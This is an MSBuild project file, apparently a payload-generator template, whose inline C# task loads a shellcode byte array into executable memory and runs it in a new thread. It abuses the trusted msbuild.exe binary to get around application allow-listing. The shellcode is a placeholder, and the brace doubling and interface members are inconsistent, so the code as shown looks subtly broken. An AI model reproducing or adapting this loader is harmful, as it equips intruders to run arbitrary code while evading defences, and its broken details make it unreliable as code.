<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RunPayload">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Diagnostics;
          using System.Runtime.InteropServices;
          public class ClassExample : Microsoft.Build.Framework.ITask
          {{
              public bool Execute()
              {{
                  byte[] shellcode = new byte[] {{ /* SHELLCODE */ }};
                  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, 0x1000, 0x40);
                  Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                  IntPtr hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);
                  WaitForSingleObject(hThread, 0xFFFFFFFF);
                  return true;
              }}
              // Import Win32 APIs
              [DllImport("kernel32")]
              static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
              [DllImport("kernel32")]
              static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, IntPtr lpThreadId);
              [DllImport("kernel32")]
              static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
              public Microsoft.Build.Framework.ITaskItem[] RequiredExecutionContext { get; set; }
          }}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

